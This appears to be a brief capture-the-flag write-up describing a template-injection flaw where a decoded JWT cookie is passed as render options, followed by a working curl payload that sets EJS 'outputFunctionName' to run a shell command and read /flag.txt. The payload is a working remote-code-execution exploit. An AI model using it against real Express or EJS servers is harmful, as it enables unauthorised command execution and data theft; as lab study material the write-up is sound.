- The jwt cookie is decoded using `JsonCookies` which allows for a json object to be created
- The decoded cookie is passed directly to the `app.render` function as the options
- this allows for the `view options` setting to be set and arbitrary javascript run with the `outputFunctionName` option:

```bash
curl -g http://localhost:3000/ -H 'Cookie: jwt=j:{"settings":{"view options":{"outputFunctionName":"a%3b return global.process.mainModule.constructor._load(%27child_process%27).execSync(%27cat /flag.txt%27)%3b //"}}}
```
